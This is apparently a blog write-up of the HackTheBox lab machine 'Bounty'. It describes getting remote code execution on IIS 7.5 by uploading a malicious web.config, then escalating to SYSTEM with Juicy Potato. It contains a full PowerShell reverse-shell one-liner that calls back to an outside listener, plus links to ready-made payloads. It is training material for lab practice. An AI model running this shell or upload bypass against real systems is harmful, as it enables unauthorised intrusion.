---
date: 2026-05-20
draft: false
title: "HTB Write-up: Bounty"
tags: ["htb", "windows", "easy", "iis", "file-upload", "web-config", "juicy-potato", "privilege-escalation"]
description: "File upload bypass via IIS web.config, escalating to SYSTEM with Juicy Potato on Server 2008 R2."
ShowToc: true
cover:
  image: "https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a7686636f7cebb477cb7b6d6ce729f2c.png"
  alt: "Bounty"
---

Windows file uploads always seem innocuous until they're not. Bounty is an easy Windows box that teaches a classic IIS trick -- the kind that shows up in real engagements more often than you'd think.

## Machine Info

| Field      | Value                          |
|------------|--------------------------------|
| Name       | Bounty                         |
| Platform   | HackTheBox                     |
| OS         | Windows                        |
| Difficulty | Easy                           |
| IP         | 10.129.35.196                  |

## TL;DR

Port 80 exposes an IIS 7.5 server with a file upload endpoint. Standard extension filters block .aspx and .asp shells, but IIS processes `web.config` files as server-side code -- uploading a malicious one gives RCE. From there, `SeImpersonatePrivilege` is enabled and the target is Windows Server 2008 R2, making Juicy Potato the natural escalation path to SYSTEM.

## Recon

Quick nmap scan confirms a single open port: HTTP on port 80, running Microsoft IIS 7.5 with the title "Bounty".

{{< figure src="/images/htb-bounty/nmap.png" alt="Nmap showing IIS 7.5 on port 80" >}}

With only HTTP exposed, everything runs through the web app. Gobuster with the raft-large-directories wordlist and aspx/asp/html/txt extensions finds three directories worth noting: `/aspnet_client`, `/transfer.aspx`, and `/uploadedfiles`.

{{< figure src="/images/htb-bounty/gobuster.png" alt="Gobuster finding transfer.aspx and uploadedfiles" >}}

## Enumeration

Navigating to the root shows a Merlin wizard image -- nothing else, just a static page.

{{< figure src="/images/htb-bounty/homepage.png" alt="Bounty homepage showing a wizard" >}}

`/transfer.aspx` is the interesting one: a bare-bones file upload form, no authentication, no visible restrictions.

{{< figure src="/images/htb-bounty/transfer-upload.png" alt="The file upload form at /transfer.aspx" >}}

The `/uploadedfiles` directory is where uploaded files land, which means if we can upload something executable, we can trigger it by visiting that path.

## Foothold

The obvious first move is uploading an ASPX webshell. Kali ships one at `/usr/share/webshells/aspx/cmdasp.aspx`:

{{< figure src="/images/htb-bounty/copy-webshell.png" alt="Copying cmdasp.aspx webshell" >}}

The upload fails immediately -- the server complains "Invalid File. Please try again."

{{< figure src="/images/htb-bounty/upload-blocked.png" alt="Upload rejected with Invalid File error" >}}

Intercepting the request in Burp and poking at the source code shows the app is doing server-side extension validation. The allowed list isn't exposed, but it's clearly blocking `.aspx`.

{{< figure src="/images/htb-bounty/burp-source.png" alt="Burp showing the upload form source code and validation" >}}

The classic double-extension bypass -- renaming the file to `cmdasp.aSPx.jpg` -- uploads fine, but the server throws a 404 when you try to navigate to it. The file is there, but IIS won't execute it through that path.

{{< figure src="/images/htb-bounty/404-bypass.png" alt="404 error when accessing the double-extension bypass" >}}

Time to consult [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md). The ASP server section lists extensions that IIS will process as server-side code -- and `.config` is on the list for IIS <= 7.5.

{{< figure src="/images/htb-bounty/payloads-extensions.png" alt="PayloadsAllTheThings listing .config as executable on IIS" >}}

This is the key insight: IIS treats `web.config` files as configuration that can include ASP.NET handler definitions, which means you can embed executable code inside one. PayloadsAllTheThings provides [a ready-made payload](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config) that adds a custom handler mapped to the config file itself, effectively turning it into a webshell.

Upload passes. Navigating to `/uploadedfiles/web.config` executes it -- the page renders a command input box and returns server info: running as `\\BOUNTY\IUSR`, IIS 7.5.

{{< figure src="/images/htb-bounty/webconfig-rce.png" alt="web.config executing as a webshell showing server info" >}}

From the RCE box, a PowerShell reverse shell is straightforward. Paste the one-liner into the command field, with a listener already running on port 443:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.208',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

{{< figure src="/images/htb-bounty/shell-merlin.png" alt="Reverse shell caught as bounty\merlin" >}}

Shell as `bounty\merlin`.

## Privilege Escalation

First check after landing: privileges.

{{< figure src="/images/htb-bounty/whoami-priv.png" alt="whoami /priv showing SeImpersonatePrivilege enabled" >}}

`SeImpersonatePrivilege` is enabled -- the classic setup for a Potato attack. The OS version confirms which flavor to use:

{{< figure src="/images/htb-bounty/systeminfo.png" alt="systeminfo showing Windows Server 2008 R2" >}}

Windows Server 2008 R2 (build 6.1.7600) means Juicy Potato is on the table. The original Potato attacks require an OS older than Windows 10 1809 / Server 2019, and 2008 R2 fits comfortably. The way it works: `SeImpersonatePrivilege` lets a service account create processes that impersonate tokens from higher-privileged COM objects. Juicy Potato automates this by abusing the DCOM activation service to get a SYSTEM-level token and then runs an arbitrary command under it.

Grab [JuicyPotato.exe](https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe), and serve it alongside a PowerShell reverse shell payload over an SMB share:

{{< figure src="/images/htb-bounty/smbserver.png" alt="impacket-smbserver serving files" >}}

From the shell on the target, pull JuicyPotato.exe over the SMB share and drop it on the Desktop:

{{< figure src="/images/htb-bounty/juicypotato-copy.png" alt="Copying JuicyPotato.exe from SMB share to target" >}}

Then create and serve `shell.ps1` -- same PowerShell reverse shell as before, this time targeting a fresh listener on port 4443. Pull it down from the SMB share the same way.

{{< figure src="/images/htb-bounty/shell-ps1.png" alt="The shell.ps1 reverse shell payload" >}}

Launch JuicyPotato, pointing it at the BITS CLSID (`{4991d34b-80a1-4291-83b6-3328366b9097}`) which is available on Server 2008 R2, and have it execute the PS1 shell:

{{< figure src="/images/htb-bounty/juicypotato-system.png" alt="JuicyPotato executing and returning NT AUTHORITY\SYSTEM" >}}

`authresult 0` and `NT AUTHORITY\SYSTEM` -- the token impersonation worked. The second listener catches the callback:

{{< figure src="/images/htb-bounty/root-shell.png" alt="SYSTEM shell with root.txt" >}}

## Takeaways

- **IIS web.config as a shell vector**: extension blacklists often block `.asp` and `.aspx` but forget about `.config`. On IIS 7.5 and below, a crafted `web.config` can execute code just like an ASPX page -- a useful trick when standard webshells are filtered.
- **SeImpersonatePrivilege = game over on old Windows**: any service running as a low-privileged user with this privilege enabled is a SYSTEM escalation waiting to happen. On Server 2008 R2 specifically, Juicy Potato is reliable and straightforward.
- **Gobuster extension scanning matters**: running gobuster without the `-x` flag on an IIS box would miss `/transfer.aspx` entirely. Always include common web extensions when scanning Windows targets.

## References

- [PayloadsAllTheThings - Upload Insecure Files](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/README.md)
- [web.config shell payload](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/refs/heads/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config)
- [JuicyPotato](https://github.com/ohpe/juicy-potato)
